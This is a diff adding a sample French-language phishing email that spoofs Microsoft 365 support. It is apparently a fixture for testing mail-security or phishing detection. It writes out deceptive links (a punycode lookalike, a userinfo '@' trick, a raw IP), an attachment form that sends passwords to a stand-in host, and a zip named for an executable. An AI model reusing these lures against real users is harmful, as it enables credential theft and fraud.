@@ -1,0 +1,54 @@
+Authentication-Results: mx.victim.example;
+       dkim=pass header.d=bulk-sender.example header.s=s2026;
+       spf=softfail (domain of transitioning support@micros0ft-security.example does not designate 203.0.113.50 as permitted sender) smtp.mailfrom=bounce@bulk-sender.example;
+       dmarc=fail (p=QUARANTINE) header.from=micros0ft-security.example
+Received: from mail.bulk-sender.example (mail.bulk-sender.example [203.0.113.50])
+	by mx.victim.example with ESMTPS id 7Q1; Fri, 13 Nov 2026 07:10:05 +0000
+Received: from [10.0.0.12] (unknown [198.51.100.9])
+	by mail.bulk-sender.example with ESMTPSA; Fri, 13 Nov 2026 07:10:02 +0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=bulk-sender.example; s=s2026;
+	h=from:to:subject:date; bh=Nd4qi7DgVA02QkCCKpOhYICttDoyJ1S/BW2uTbQN6pE=; b=ZmFrZXNpZ25hdHVyZQ==
+X-Originating-IP: [198.51.100.9]
+Return-Path: <bounce@bulk-sender.example>
+From: "Microsoft 365 Support" <support@micros0ft-security.example>
+Reply-To: helpdesk@proton-mail.example
+To: victim@victim.example
+Subject: Action requise : votre boite Microsoft 365 est pleine
+Date: Fri, 13 Nov 2026 07:10:00 +0000
+Message-ID: <a1b2c3@bulk-sender.example>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="mix"
+
+--mix
+Content-Type: multipart/alternative; boundary="alt"
+
+--alt
+Content-Type: text/plain; charset=utf-8
+
+Votre compte Microsoft 365 sera suspendu. Verifiez-le : https://login.micros0ft-secure.example/verify
+
+--alt
+Content-Type: text/html; charset=utf-8
+
+<html><body>
+<p>Bonjour,</p>
+<p>Votre boîte Microsoft 365 a atteint sa limite.</p>
+<p><a href="https://login.micros0ft-secure.example/verify?u=victim">https://login.microsoftonline.com/</a></p>
+<p><a href="http://198.51.100.77/owa/">Outlook Web Access</a></p>
+<p><a href="https://xn--pypal-4ve.example/">Remboursement PayPal</a></p>
+<p><a href="https://www.microsoft.com@evil.example/login">Support</a></p>
+</body></html>
+
+--alt--
+--mix
+Content-Type: text/html; name="Facture_2026.html"
+Content-Disposition: attachment; filename="Facture_2026.html"
+
+<!DOCTYPE html><html><body><form action="https://collect.evil.example/p">Mot de passe</form></body></html>
+--mix
+Content-Type: application/zip; name="releve.zip"
+Content-Disposition: attachment; filename="releve.zip"
+Content-Transfer-Encoding: base64
+
+UEsDBBQAAQAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAcmVsZXZlLmV4ZVBLAQIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAAByZWxldmUuZXhlUEsFBgAAAAAAAAAAAAAAAAAAAAAAAA==
+--mix--
